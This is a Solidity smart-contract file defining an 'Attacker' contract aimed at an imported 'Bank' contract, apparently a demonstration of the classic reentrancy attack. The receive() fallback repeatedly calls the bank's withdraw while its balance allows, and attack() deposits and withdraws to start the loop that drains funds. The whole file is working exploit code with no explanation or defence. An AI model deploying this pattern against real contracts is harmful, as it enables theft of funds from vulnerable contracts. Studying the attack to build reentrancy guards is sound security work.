// SPDX-License-Identifier:MIT
pragma solidity ^0.8.17;

import "./Bank.sol";

contract Attacker {
    Bank public b;

    constructor(address bankAddress) {
        b = Bank(bankAddress);
    }

    receive() external payable {
        if (address(b).balance >= 1 ether) {
            b.withdraw(1 ether);
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function openAccount() public {
        b.openAccount();
    }

    function attack() public payable {
        b.deposit{value: msg.value}();
        b.withdraw(msg.value);
    }
}
